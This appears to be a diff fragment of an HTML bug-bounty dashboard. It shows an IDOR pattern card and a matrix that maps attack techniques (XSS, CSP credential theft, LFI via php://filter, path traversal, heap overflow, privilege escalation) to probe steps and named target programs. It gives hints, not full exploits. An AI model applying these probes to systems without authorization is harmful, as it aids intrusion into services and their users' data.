+<div class="meta">2026-11-19 · discourse · <span class="hunt-score">Hunt: 3/5</span></div>
+<div class="what"><strong>Pattern:</strong> IDOR on notification metadata API.</div>
+<div class="signal"><strong>Apply to:</strong> Notification API endpoints. Swap user IDs.</div>
+</div>
+
+</div>
+</div>
+
+<!-- MATRIX TAB -->
+<div class="panel" id="matrix">
+<div class="section-title">Target Application Matrix</div>
+<p style="color:var(--muted);font-size:13px;margin-bottom:16px">Map each technique to your active targets. Priority based on stack match + hunt value.</p>
+
+<table class="target-matrix">
+<thead>
+<tr>
+<th>Technique / CVE</th>
+<th>Stack Signal</th>
+<th>Probe Command</th>
+<th>Apply To Targets</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>innerHTML XSS sans =</strong></td>
+<td>Any JS-heavy SPA</td>
+<td><code>grep -rn 'innerHTML' dist/</code></td>
+<td>ArenaNet (re-test), Epic Games (WebView2), Discourse, any React/Vue target</td>
+</tr>
+<tr>
+<td><strong>CSP cred theft</strong></td>
+<td>Any target with HTML injection + weak CSP</td>
+<td><code>curl -sI target | grep csp</code></td>
+<td>All targets — check CSP for missing form-action</td>
+</tr>
+<tr>
+<td><strong>Backup priv esc</strong></td>
+<td>Multi-tenant SaaS with import/export</td>
+<td>Find export feature, grep for role fields</td>
+<td>Discourse, Weblate-pattern apps, GitLab, any project management tool</td>
+</tr>
+<tr>
+<td><strong>Image heap overflow</strong></td>
+<td>Server-side image processing</td>
+<td>Upload crafted TIFF, watch for 500</td>
+<td>All targets with image upload — Basecamp pattern generalizes</td>
+</tr>
+<tr>
+<td><strong>Atlassian file read</strong></td>
+<td>Jira / Confluence / Bitbucket</td>
+<td>Path traversal per watchTowr</td>
+<td>Any target running self-hosted Atlassian stack</td>
+</tr>
+<tr>
+<td><strong>PHP2Shell</strong></td>
+<td>PHP with file inclusion</td>
+<td><code>php://filter</code> reachable paths</td>
+<td>WordPress targets, PHP-based programs</td>
+</tr>
+<tr>
+<td><strong>CSPT → org modify</strong></td>
+<td>Client-side routing + org API</td>
+<td>Manipulate client-side paths</td>
+<td>All SaaS targets — apply CSPT research pattern</td>
+</tr>
+<tr>
+<td><strong>HTTP/2 UAF</strong></td>
+<td>Node.js with HTTP/2</td>
+<td>Concurrent stream create/teardown</td>
+<td>Node.js targets using HTTP/2 — check with <code>curl --http2</code></td>
+</tr>
+<tr>
+<td><strong>PDF LFI (ABCpdf)</strong></td>
+<td>.NET with PDF generation</td>
+<td>Path traversal in PDF export params</td>
+<td>Any .NET target with PDF export/download feature</td>
+</tr>
+<tr>
+<td><strong>SVG XSS</strong></td>
+<td>Image upload serving SVG inline</td>
+<td>Upload SVG, check Content-Type</td>
+<td>All targets with image/file upload — avatar, media, attachments</td>
+</tr>
+</tbody>
+</table>
+
+</div>
+
+</div>
+
+<script>
+document.querySelectorAll('.tab').forEach(tab=>{
+tab.addEventListener('click',()=>{
+document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+tab.classList.add('active');
+document.getElementById(tab.dataset.tab).classList.add('active');
+});
+});
+</script>
+</body>
+</html>
